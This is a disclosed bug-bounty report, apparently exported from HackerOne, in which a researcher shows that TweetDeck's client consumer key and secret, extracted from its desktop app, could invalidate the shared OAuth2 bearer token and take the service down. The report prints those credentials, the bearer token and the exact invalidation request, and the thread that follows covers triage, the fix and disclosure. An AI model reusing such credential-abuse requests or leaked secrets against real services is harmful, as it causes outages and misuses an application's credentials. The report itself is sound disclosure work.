{"id":210779,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTA3Nzk=","url":"https://hackerone.com/reports/210779","title":"[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-05T05:51:40.922Z","submitted_at":"2017-03-05T05:51:40.922Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"filedescriptor","url":"/filedescriptor","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-25T17:00:51.281Z","bug_reporter_agreed_on_going_public_at":"2019-04-17T04:30:49.723Z","team_member_agreed_on_going_public_at":"2019-04-25T17:00:51.220Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"First of all, really sorry for the unintentional DoS :( I was testing it with a fresh bearer token but copied the production one accidentally.\n\n#Details\nI've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token):\n```http\nGET https://api.twitter.com/1.1/help/settings.json?settings_version= HTTP/1.1\nHost: api.twitter.com\nConnection: keep-alive\nAuthorization: Bearer AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM\nOrigin: https://tweetdeck.twitter.com\nX-Csrf-Token: 2170b7f455955368495bc191ed67c892\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\nAccept: text/plain, */*; q=0.01\nX-Twitter-Auth-Type: OAuth2Session\nX-Twitter-Client-Version: Twitter-TweetDeck-blackbird-chrome/4.0.170302174617 web/\nReferer: https://tweetdeck.twitter.com/\nAccept-Encoding: gzip, deflate, sdch, br\nAccept-Language: en-US,en;q=0.8\n```\n\nAccording to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token\n\nNow, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client. The consumer key and consumer secret can be extracted from the desktop application:\n\n```\nConsumer key:    yT577ApRtZw51q4NPMPPOQ\nConsumer secret: 3neq3XqN5fO3obqwZoajavGFCUrC42ZfbrLXy5sCv8\n```\n\nApparently, anyone can invalidate the bearer token while issuing token invalidation request:\n```http\nPOST https://api.twitter.com/oauth2/invalidate_token HTTP/1.1\nAuthorization: Basic eVQ1NzdBcFJ0Wnc1MXE0TlBNUFBPUTozbmVxM1hxTjVmTzNvYnF3Wm9hamF2R0ZDVXJDNDJaZmJyTFh5NXNDdjg=\nHost: api.twitter.com\nContent-Length: 125\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\n\naccess_token=AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM\n```\n\nAnd suddenly all the requests on TweetDeck result in `{\"errors\":[{\"code\":89,\"message\":\"Invalid or expired token.\"}]}`.\n","bounty_amount":"5040.0","formatted_bounty":"$5,040","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-17T04:30:49.834Z","allow_singular_disclosure_after":-75893592.19249132,"singular_disclosure_allowed":true,"vote_count":315,"voters":["pajoda","spaceraccoon","checkm50","msultan","vavkamil","foobar7","kapytein","mashoud1122","s1r1u5","corb3nik","and 305 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1519851,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2017-03-05T06:11:22.065Z","updated_at":"2017-03-05T06:11:22.065Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1519856,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I suspect other services could potential have the same issues. For example mobile.twitter.com is also using the same way to establish API connections. Fix-wise I wonder if forbidding bearer token invalidation on official clients is enough.","automated_response":false,"created_at":"2017-03-05T06:20:05.741Z","updated_at":"2017-03-05T06:21:30.437Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1519865,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi filedescriptor,\n\nThanks for the information. While we investigate this issue and fix the bearer token for tweetdeck.twitter.com please don't try to revoke any other OAuth bearer tokens until this report has been closed out. We'll take the full impact of this issue into consideration when we award a bounty.\n\nThanks for thinking of Twitter security!","automated_response":false,"created_at":"2017-03-05T06:36:41.037Z","updated_at":"2017-03-05T06:36:41.037Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1519872,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I stopped all my testings immediately after I realized the consequence so yeah I won't.","automated_response":false,"created_at":"2017-03-05T06:49:56.382Z","updated_at":"2017-03-05T06:51:42.090Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1519898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. We've restored TweetDeck but are still looking into the issue of being able to invalidate the bearer token.","automated_response":false,"created_at":"2017-03-05T07:30:03.437Z","updated_at":"2017-03-05T07:30:03.437Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1522306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I also noticed mobile Twitter clients depend on a similar way (for the xAuth part) but they generate a new bearer token every time.\n\nAccording to the documentation: https://dev.twitter.com/oauth/reference/post/oauth2/token\n\u003e Only one bearer token may exist outstanding for an application, and repeated requests to this method will yield the same already-existent token until it has been invalidated.\n\nSo technically they are always the same until being invalidated (and that explains why I accidentally DoS'd TweetDeck despite using a fresh token which was actually the same as the production one)\n\nMoving on:\n\u003e [..] If attempted too frequently, requests will be rejected with a HTTP 403 with code 99\n\nSo an attacker could in theory keep creating and invalidating the bearer token for the mobile Twitter clients and achieve DoS there.\n\nPS. Of course I didn't try it.","automated_response":false,"created_at":"2017-03-06T17:16:39.710Z","updated_at":"2017-03-06T17:26:19.914Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1549017,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","automated_response":false,"created_at":"2017-03-17T22:32:51.240Z","updated_at":"2017-03-17T22:32:51.240Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"bounty_amount":"5040.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"filedescriptor","url":"/filedescriptor"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1788566,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2017-06-28T21:29:08.927Z","updated_at":"2017-06-28T21:29:08.927Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1789468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm not sure how to retest it as it might make certain services unavailable again. How do you think I should proceed?","automated_response":false,"created_at":"2017-06-29T05:28:02.821Z","updated_at":"2017-06-29T05:30:27.327Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1802224,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Pinging again","automated_response":false,"created_at":"2017-07-04T15:29:08.950Z","updated_at":"2017-07-04T15:29:08.950Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1809096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Understood. We believe this issue is fixed so testing should not have any impact. However, testing with a test application (where possible) instead of a production application would be preferred.","automated_response":false,"created_at":"2017-07-05T21:45:25.522Z","updated_at":"2017-07-05T21:45:25.522Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1809735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe the consumer secret for TweetDeck has been rotated, and other official clients have rejected invalidation requests: `{\"errors\":[{\"code\":348,\"message\":\"Client application is not permitted to to invalidate this token.\"}]}`. I think it's fixed.","automated_response":false,"created_at":"2017-07-06T05:48:01.162Z","updated_at":"2017-07-06T05:48:10.740Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1809736,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-07-06T05:48:36.400Z","updated_at":"2017-07-06T05:48:36.400Z","first_to_agree":true,"actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1815696,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@filedescriptor would like to request we hold off publishing for now. As a part of the clean up after the issue was discovered, we found the scope is larger than just TD. I want to wait and get the remaining updated and then give the all clear to publish if thats ok?","automated_response":false,"created_at":"2017-07-07T21:09:07.526Z","updated_at":"2017-07-07T21:09:07.526Z","actor":{"username":"swilson","cleared":false,"url":"/swilson","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/132/014/e6a1b43decb64af24556f177a0980d6d50c2cd14_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1815700,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Reopening report as scope is more than just TD. Also re-opened JIRA ticket.","automated_response":false,"created_at":"2017-07-07T21:09:43.101Z","updated_at":"2017-07-07T21:09:43.101Z","actor":{"username":"swilson","cleared":false,"url":"/swilson","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/132/014/e6a1b43decb64af24556f177a0980d6d50c2cd14_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1816314,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem at all","automated_response":false,"created_at":"2017-07-08T06:38:50.089Z","updated_at":"2017-07-08T06:38:50.089Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4495089,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Our documentation now clearly calls out the repercussions of having OAuth credentials that are public and how that allows requests to be made on behalf of the application.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2019-04-05T23:11:12.813Z","updated_at":"2019-04-05T23:11:12.813Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4511839,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@filedescriptor just wanted to checkin with you about the disclosure, did you want to proceed or cancel out the disclosure request? ","automated_response":false,"created_at":"2019-04-08T19:16:16.279Z","updated_at":"2019-04-08T19:16:16.279Z","actor":{"username":"acamacho","cleared":false,"url":"/acamacho","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4579742,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Let's disclose it!","automated_response":false,"created_at":"2019-04-17T04:30:49.786Z","updated_at":"2019-04-17T04:30:49.786Z","first_to_agree":true,"actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4642878,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-25T17:00:51.243Z","updated_at":"2019-04-25T17:00:51.243Z","actor":{"username":"acamacho","cleared":false,"url":"/acamacho","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4642879,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-25T17:00:51.299Z","updated_at":"2019-04-25T17:00:51.299Z","actor":{"username":"acamacho","cleared":false,"url":"/acamacho","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}